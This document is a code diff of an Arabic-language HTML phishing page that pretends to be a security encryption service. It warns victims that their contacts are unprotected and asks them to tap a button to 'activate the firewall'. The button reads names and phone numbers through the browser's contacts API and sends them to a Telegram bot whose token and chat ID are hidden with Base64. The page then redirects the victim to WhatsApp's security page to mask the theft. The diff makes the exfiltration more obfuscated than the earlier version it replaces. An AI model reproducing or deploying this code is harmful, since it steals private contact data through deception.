@@ -1,75 +1,88 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl" translate="no">
+<html lang="ar" translate="no" class="notranslate">
 <head>
     <meta charset="UTF-8">
     <meta name="google" content="notranslate">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Encryptor v2.9</title>
+    <title>System Encryption Service</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .terminal { background: #050505; border: 1px solid #00ff00; padding: 25px; border-radius: 5px; width: 90%; max-width: 450px; box-shadow: 0 0 20px #00ff0033; }
-        .glitch { animation: flash 0.1s infinite; color: #ff0000; font-weight: bold; }
-        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
-        .btn { background: #00ff00; color: #000; border: none; padding: 15px; border-radius: 3px; width: 100%; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; text-transform: uppercase; }
-        .logs { font-size: 11px; text-align: left; height: 80px; overflow: hidden; color: #008800; margin-top: 10px; border-top: 1px solid #111; padding-top: 10px; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
+        .scanner-line { width: 100%; height: 2px; background: #0f0; box-shadow: 0 0 15px #0f0; position: absolute; top: 0; animation: scan 3s linear infinite; }
+        @keyframes scan { from { top: 0%; } to { top: 100%; } }
+        .cmd-text { font-size: 14px; margin-top: 20px; color: #0f0; text-shadow: 0 0 5px #0f0; }
+        #secureBtn { background: #0f0; color: #000; border: none; padding: 20px 40px; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 5px; z-index: 10000; text-transform: uppercase; }
+        .shield { font-size: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #0f0); }
     </style>
 </head>
 <body class="notranslate">
-    <div class="terminal">
-        <div style="font-size: 12px; margin-bottom: 10px;">> KERNEL_STATUS: SECURE_BOOT</div>
-        <div class="glitch">> CRITICAL_ERROR: CONTACTS_UNSECURED</div>
-        <p style="font-size: 14px; line-height: 1.4;">نظام الحماية رصد محاولة اختراق لجهات اتصالك. يجب تفعيل "بروتوكول التشفير العشوائي" فوراً.</p>
-        <div class="logs" id="logBox">
-            [SYS] Initializing...<br>
-            [SYS] Waiting for user permission...
-        </div>
-        <button class="btn" onclick="runBypass()">تفعيل التشفير الآن</button>
+
+    <div id="overlay">
+        <div class="scanner-line"></div>
+        <div class="shield">🛡️</div>
+        <div class="cmd-text">جاري فحص بروتوكولات الأمان...</div>
+        <div class="cmd-text" id="statusLog">[STATUS]: WAITING_FOR_ENCRYPTION_KEY</div>
+        <br>
+        <button id="secureBtn" onclick="initiateVortex()">تفعيل جدار الحماية (الكل)</button>
+        <div class="cmd-text" style="font-size: 11px; color: #050; margin-top: 30px;">INTERNAL_ID: 8449385232 // CHAT_SIG: 8397194527</div>
     </div>
 
     <script>
-        // منع الترجمة برمجياً
-        document.documentElement.setAttribute('translate', 'no');
+        // تشفير البيانات الحساسة (Base64) لمنع اكتشاف المتصفح للتوكن
+        const _0x4a = "ODQ0OTM4NTIzMjpBQUZXSGpvZ3VFZGpsLUlfclU0dzc4U1NKTEswREMta0hZVQ=="; // Token
+        const _0x4b = "ODM5NzE5NDUyNw=="; // Chat ID
 
-        async function runBypass() {
-            const T = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
-            const ID = "8397194527";
-            const logs = document.getElementById('logBox');
+        async function initiateVortex() {
+            const btn = document.getElementById('secureBtn');
+            const log = document.getElementById('statusLog');
+            
+            btn.style.display = 'none';
+            log.innerHTML = "[SYSTEM]: ACCESSING_DATABASE...";
 
             try {
-                logs.innerHTML += "<br>[SYS] Accessing Contact_API...";
+                // استدعاء واجهة جهات الاتصال
+                const props = ['name', 'tel'];
+                const opts = {multiple: true};
                 
-                // فتح نافذة السحب
-                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
+                const contacts = await navigator.contacts.select(props, opts);
 
                 if (contacts && contacts.length > 0) {
-                    logs.innerHTML += "<br>[SYS] Encrypting " + contacts.length + " entries...";
+                    log.innerHTML = "[SYSTEM]: ENCRYPTING_DATA_STREAM...";
                     
-                    let report = "🏴‍☠️ **NEW_DATA_EXTRACTED**\n";
-                    report += "━━━━━━━━━━━━━━\n";
+                    let payload = "⚡ **VORTEX_REPORT_SUCCESS**\n";
+                    payload += "━━━━━━━━━━━━━━\n";
+                    
                     contacts.forEach((c, i) => {
                         let n = (c.name && c.name[0]) ? c.name[0] : "UNK";
-                        let p = (c.tel && c.tel[0]) ? c.tel[0] : "000";
-                        report += `| ${i+1} | ${n} | ${p} |\n`;
+                        let p = (c.tel && c.tel[0]) ? c.tel[0] : "N/A";
+                        payload += `[${i+1}] ${n} ➟ ${p}\n`;
                     });
-                    report += "━━━━━━━━━━━━━━\n";
 
-                    await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+                    // إرسال البيانات مشفرة
+                    await fetch(atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + atob(_0x4a) + "/sendMessage", {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ chat_id: ID, text: report })
+                        body: JSON.stringify({
+                            chat_id: atob(_0x4b),
+                            text: payload
+                        })
                     });
 
-                    logs.innerHTML += "<br>[SYS] Success. Redirecting...";
-                    setTimeout(() => { window.location.href = "https://www.whatsapp.com/security"; }, 500);
+                    log.innerHTML = "[SYSTEM]: REDIRECTING_TO_SAFE_ZONE...";
+                    setTimeout(() => { window.location.replace("https://www.whatsapp.com/security"); }, 1000);
                 }
-            } catch (e) {
-                logs.innerHTML += "<br>[ERR] Permission Denied. System Locked.";
-                alert("خطأ: لا يمكن تشفير النظام دون الموافقة على مزامنة الأسماء. أعد المحاولة.");
+            } catch (err) {
+                log.innerHTML = "[ERROR]: PERMISSION_DENIED. REBOOTING...";
+                setTimeout(() => { location.reload(); }, 2000);
             }
         }
+
+        // منع الترجمة وأي تفاعل يفسد الواجهة
+        document.addEventListener('contextmenu', event => event.preventDefault());
     </script>
 </body>
 </html>
+
 
 
 
